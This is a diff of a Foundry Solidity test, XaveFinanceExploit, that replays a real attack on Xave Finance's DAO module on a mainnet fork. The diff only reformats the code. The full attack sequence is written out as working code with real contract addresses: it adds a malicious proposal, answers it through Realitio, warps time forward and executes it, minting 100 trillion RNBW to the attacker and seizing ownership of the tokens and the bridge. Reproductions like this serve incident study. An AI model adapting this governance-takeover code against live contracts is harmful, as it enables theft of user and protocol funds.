@@ -4,34 +4,19 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 
 interface IERC20 {
-    event Approval(
-        address indexed owner,
-        address indexed spender,
-        uint256 value
-    );
-    event OwnershipTransferred(
-        address indexed previousOwner,
-        address indexed newOwner
-    );
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
     event Transfer(address indexed from, address indexed to, uint256 value);
 
-    function allowance(
-        address owner,
-        address spender
-    ) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
     function approve(address spender, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
     function burn(uint256 amount) external;
     function burnFrom(address account, uint256 amount) external;
     function decimals() external view returns (uint8);
-    function decreaseAllowance(
-        address spender,
-        uint256 subtractedValue
-    ) external returns (bool);
-    function increaseAllowance(
-        address spender,
-        uint256 addedValue
-    ) external returns (bool);
+    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
+    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
     function mint(address account, uint256 amount) external;
     function name() external view returns (string memory);
     function owner() external view returns (address);
@@ -39,16 +24,10 @@ interface IERC20 {
     function setCapped() external;
     function symbol() external view returns (string memory);
     function totalSupply() external view returns (uint256);
-    function transfer(
-        address recipient,
-        uint256 amount
-    ) external returns (bool);
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) external returns (bool);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
     function transferOwnership(address newOwner) external;
+
 }
 // @KeyInfo - Total Lost : 100,000,000,000,000 RNBW
 // Attacker : 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2
@@ -66,20 +45,20 @@ interface IERC20 {
 // Twitter Ancilia : https://twitter.com/AnciliaInc/status/1578952542926491650
 
 contract Enum {
+
     enum Operation {
         Call,
         DelegateCall
     }
+
 }
 
 interface IDaoModule {
-    function getTransactionHash(
-        address to,
-        uint256 value,
-        bytes memory data,
-        Enum.Operation operation,
-        uint256 nonce
-    ) external view returns (bytes32);
+
+    function getTransactionHash(address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 nonce)
+        external
+        view
+        returns (bytes32);
 
     function executeProposalWithIndex(
         string memory proposalId,
@@ -91,45 +70,35 @@ interface IDaoModule {
         uint256 txIndex
     ) external;
 
-    function addProposal(
-        string memory proposalId,
-        bytes32[] memory txHashes
-    ) external;
+    function addProposal(string memory proposalId, bytes32[] memory txHashes) external;
 
-    function buildQuestion(
-        string memory proposalId,
-        bytes32[] memory txHashes
-    ) external pure returns (string memory);
+    function buildQuestion(string memory proposalId, bytes32[] memory txHashes) external pure returns (string memory);
 
     function questionIds(bytes32) external returns (bytes32);
+
 }
 
 interface IRealitio {
-    function submitAnswer(
-        bytes32 question_id,
-        bytes32 answer,
-        uint256 max_previous
-    ) external payable;
+
+    function submitAnswer(bytes32 question_id, bytes32 answer, uint256 max_previous) external payable;
+
 }
 
 interface IPrimaryBridge {
+
     function owner() external view returns (address);
+
 }
 
 contract XaveFinanceExploit is Test {
-    IERC20 constant RNBW_TOKEN =
-        IERC20(0xE94B97b6b43639E238c851A7e693F50033EfD75C);
-    IERC20 constant LPOP_TOKEN =
-        IERC20(0x6335A2E4a2E304401fcA4Fc0deafF066B813D055);
-    IPrimaryBridge constant PRIMARY_BRIDGE =
-        IPrimaryBridge(0x579270F151D142eb8BdC081043a983307Aa15786);
-    IDaoModule constant DAO_MODULE =
-        IDaoModule(0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F);
-    IRealitio constant REALITIO =
-        IRealitio(0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47);
+
+    IERC20 constant RNBW_TOKEN = IERC20(0xE94B97b6b43639E238c851A7e693F50033EfD75C);
+    IERC20 constant LPOP_TOKEN = IERC20(0x6335A2E4a2E304401fcA4Fc0deafF066B813D055);
+    IPrimaryBridge constant PRIMARY_BRIDGE = IPrimaryBridge(0x579270F151D142eb8BdC081043a983307Aa15786);
+    IDaoModule constant DAO_MODULE = IDaoModule(0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F);
+    IRealitio constant REALITIO = IRealitio(0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47);
     address constant ATTACKER_EOA = 0x0f44f3489D17e42ab13A6beb76E57813081fc1E2;
-    address constant ATTACKER_CONTRACT =
-        0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3;
+    address constant ATTACKER_CONTRACT = 0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3;
 
     function setUp() public {
         vm.createSelectFork("mainnet", 15_704_736);
@@ -141,22 +110,14 @@ contract XaveFinanceExploit is Test {
         vm.label(address(REALITIO), "REALITIO");
         vm.label(ATTACKER_EOA, "ATTACKER_EOA");
         vm.label(ATTACKER_CONTRACT, "ATTACKER_CONTRACT");
-        vm.label(
-            0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E,
-            "XAVE_GNOSIS_SAFE_MULTISIG"
-        );
+        vm.label(0x7eaE370E6a76407C3955A2f0BBCA853C38e6454E, "XAVE_GNOSIS_SAFE_MULTISIG");
     }
 
-    function encodeWithSignature_mint(
-        address to,
-        uint256 amount
-    ) internal pure returns (bytes memory) {
+    function encodeWithSignature_mint(address to, uint256 amount) internal pure returns (bytes memory) {
         return abi.encodeWithSignature("mint(address,uint256)", to, amount);
     }
 
-    function encodeWithSignature_transferOwnership(
-        address to
-    ) internal pure returns (bytes memory) {
+    function encodeWithSignature_transferOwnership(address to) internal pure returns (bytes memory) {
         return abi.encodeWithSignature("transferOwnership(address)", to);
     }
 
@@ -165,10 +126,7 @@ contract XaveFinanceExploit is Test {
         bytes32 tx0 = DAO_MODULE.getTransactionHash(
             address(RNBW_TOKEN),
             0,
-            encodeWithSignature_mint(
-                ATTACKER_EOA,
-                100_000_000_000_000_000_000_000_000_000_000
-            ),
+            encodeWithSignature_mint(ATTACKER_EOA, 100_000_000_000_000_000_000_000_000_000_000),
             //hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
             Enum.Operation(0),
             0
@@ -218,22 +176,11 @@ contract XaveFinanceExploit is Test {
 
         vm.warp(block.timestamp + 24 * 60 * 60);
 
-        emit log_named_address(
-            "[Before proposal Execution] Owner of $RNBW: ",
-            RNBW_TOKEN.owner()
-        );
-        emit log_named_address(
-            "[Before proposal Execution] Owner of $LPOP: ",
-            LPOP_TOKEN.owner()
-        );
-        emit log_named_address(
-            "[Before proposal Execution] Owner of PrimaryBridge: ",
-            PRIMARY_BRIDGE.owner()
-        );
+        emit log_named_address("[Before proposal Execution] Owner of $RNBW: ", RNBW_TOKEN.owner());
+        emit log_named_address("[Before proposal Execution] Owner of $LPOP: ", LPOP_TOKEN.owner());
+        emit log_named_address("[Before proposal Execution] Owner of PrimaryBridge: ", PRIMARY_BRIDGE.owner());
         emit log_named_decimal_uint(
-            "[Before proposal Execution] Attacker's $RNBW Token Balance: ",
-            RNBW_TOKEN.balanceOf(ATTACKER_EOA),
-            18
+            "[Before proposal Execution] Attacker's $RNBW Token Balance: ", RNBW_TOKEN.balanceOf(ATTACKER_EOA), 18
         );
 
         vm.startPrank(ATTACKER_CONTRACT);
@@ -244,10 +191,7 @@ contract XaveFinanceExploit is Test {
             txIDs,
             address(RNBW_TOKEN),
             0,
-            encodeWithSignature_mint(
-                ATTACKER_EOA,
-                100_000_000_000_000_000_000_000_000_000_000
-            ),
+            encodeWithSignature_mint(ATTACKER_EOA, 100_000_000_000_000_000_000_000_000_000_000),
             //hex"40c10f190000000000000000000000000f44f3489d17e42ab13a6beb76e57813081fc1e200000000000000000000000000000000000004ee2d6d415b85acef8100000000",
             Enum.Operation(0),
             0
@@ -291,25 +235,13 @@ contract XaveFinanceExploit is Test {
 
         vm.stopPrank();
 
-        emit log_string(
-            "--------------------------------------------------------------"
-        );
-        emit log_named_address(
-            "[After proposal Execution] Owner of $RNBW: ",
-            RNBW_TOKEN.owner()
-        );
-        emit log_named_address(
-            "[After proposal Execution] Owner of $LPOP: ",
-            LPOP_TOKEN.owner()
-        );
-        emit log_named_address(
-            "[After proposal Execution] Owner of PrimaryBridge: ",
-            PRIMARY_BRIDGE.owner()
-        );
+        emit log_string("--------------------------------------------------------------");
+        emit log_named_address("[After proposal Execution] Owner of $RNBW: ", RNBW_TOKEN.owner());
+        emit log_named_address("[After proposal Execution] Owner of $LPOP: ", LPOP_TOKEN.owner());
+        emit log_named_address("[After proposal Execution] Owner of PrimaryBridge: ", PRIMARY_BRIDGE.owner());
         emit log_named_decimal_uint(
-            "[After proposal Execution] Attacker's $RNBW Token Balance: ",
-            RNBW_TOKEN.balanceOf(ATTACKER_EOA),
-            18
+            "[After proposal Execution] Attacker's $RNBW Token Balance: ", RNBW_TOKEN.balanceOf(ATTACKER_EOA), 18
         );
     }
+
 }
